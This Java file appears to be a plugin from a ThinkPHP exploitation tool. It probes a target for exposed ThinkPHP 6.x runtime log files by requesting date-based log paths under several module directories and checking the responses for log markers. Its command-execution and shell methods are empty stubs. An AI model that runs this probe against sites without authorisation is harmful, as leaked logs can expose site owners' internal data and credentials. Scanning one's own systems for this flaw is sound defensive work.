package com.thinkphp.thinkphpgui.exploit;

import com.github.kevinsawicki.http.HttpRequest;
import com.thinkphp.thinkphpgui.common.BasePayload;
import com.thinkphp.thinkphpgui.entity.Result;

import java.util.ArrayList;
import java.util.Date;


public class tp6_log implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        Date dt = new Date();
        String year = String.format("%tY", dt);
        String CheckStr = "RunTime";
        String CheckErr = "[ error ]";
        String mon = String.format("%tm", dt);
        String day = String.format("%td", dt);
        String suffix1 = year + mon + "/" + day + ".log";
        ArrayList<String> payload_urls = new ArrayList<String>() {{
            add(url + "/runtime/log/" + suffix1);
            add(url + "/runtime/log/Home/" + suffix1);
            add(url + "/runtime/log/Common/" + suffix1);
            add(url + "/runtime/log/Admin/" + suffix1);
        }};
        try {
            for (String payload_url : payload_urls) {
                String res = HttpRequest.get(payload_url).body();
                if (res.contains(CheckStr) || res.contains(CheckErr)) {
                    return new Result(true, "ThinkPHP 6.x 日志泄露", payload_url);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, "ThinkPHP 6.x 日志泄露", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        return new Result(false, null, null);
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}
